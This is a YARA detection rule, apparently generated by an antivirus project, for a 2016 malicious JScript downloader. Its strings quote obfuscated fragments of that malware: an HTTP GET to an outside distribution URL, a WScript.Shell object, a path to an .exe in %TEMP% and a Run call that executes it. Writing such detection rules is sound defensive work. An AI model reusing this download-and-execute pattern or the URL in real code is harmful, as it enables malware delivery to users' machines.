rule sig_20160401_182c0ab273d5252bf7231d500983bebe {
  meta:
    description = "datamaliciousorder - file 20160401_182c0ab273d5252bf7231d500983bebe.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5f2c0cfc8032deeb4e44dc1491f9246983fa903bb79c31c6dad0cd2b6dc629ce"

  strings:
    $s1  = "AcfEzz[FmgQl](\"G\" + \"ET\", \"http://geetanjalifincorp.com/pqw9aso\", false);" fullword ascii
    $s2  = "function KpEfx(BovHli, CyRpe){OknYxq = OknYxq * 1; return BovHli - CyRpe;};" fullword ascii
    $s3  = "var MibSd = function SbZy() {return WScript[VoRx](\"WScript\"+\".Shell\");}(), CxcXp = 11;" fullword ascii
    $s4  = "if (AcfEzz[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function SxLwn() {return MibSd[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"CTsG9wQm.ex\" + \"e\";};" fullword ascii
    $s6  = "function ZxxWs(){return QdaPtt + \"\";};" fullword ascii
    $s7  = "function FkhIgw() {return ((LcgJjl == true) && (LcgJjl == ZqJqx)) ? 1 : OknYxq;};" fullword ascii
    $s8  = "var ZqJqx = false;" fullword ascii
    $s9  = "function EdaLez(){return 23;};" fullword ascii
    $s10 = "function DlFpu()" fullword ascii
    $s11 = "var DoyLmu = false;" fullword ascii
    $s12 = "LcgJjl = true; " fullword ascii
    $s13 = "var MyRom = new this[\"Date\"]();" fullword ascii
    $s14 = "var LcgJjl = false;" fullword ascii
    $s15 = "function VthNus(AbJx) {var XhNv = (1, 2, 3, 4, 5, AbJx); return XhNv;};" fullword ascii
    $s16 = "function BdrGtr(LzjYhm){MibSd[\"R\"+\"un\"](LzjYhm, OknYxq, OknYxq);};" fullword ascii
    $s17 = "ZqJqx = true; " fullword ascii
    $s18 = "}while (XpQl);" fullword ascii
    $s19 = "function NtiKks(){return VoRx;};" fullword ascii
    $s20 = "return KpEfx(FzzJg, ScsRgj);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}